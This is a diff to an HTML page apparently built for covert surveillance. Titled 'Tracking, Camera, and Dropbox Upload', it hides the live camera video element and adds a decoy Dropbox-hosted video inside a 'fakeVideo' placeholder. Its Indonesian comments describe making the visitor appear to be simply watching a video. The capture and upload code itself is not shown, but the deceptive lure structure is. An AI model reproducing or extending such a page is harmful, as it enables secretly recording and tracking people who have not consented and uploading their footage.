@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tracking and Uploading to Dropbox</title>
+    <title>Tracking, Camera, and Dropbox Upload</title>
     <style>
         #videoElement {
             width: 100%;
@@ -34,16 +34,18 @@
     
     <div id="videoContainer">
         <!-- Video yang tampilkan akan disembunyikan -->
-        <video id="videoElement" autoplay muted>
-            <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?raw=1" type="video/mp4">
-            Browser Anda tidak mendukung tag video.
-        </video>
+        <video id="videoElement" autoplay muted></video>
         <video id="recordedVideo" controls></video>
     </div>
 
     <!-- Placeholder untuk manipulasi tampilan seolah menonton video -->
     <div id="fakeVideo">
         <p>Menonton Video...</p>
+        <!-- Video yang diputar dari Dropbox -->
+        <video width="100%" height="auto" controls>
+            <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?rlkey=94pagrxrt67vg2jhrzo2yp0vv&st=aommju4o&raw=1" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
     </div>
 
     <!-- Tombol untuk memulai semua fungsi -->
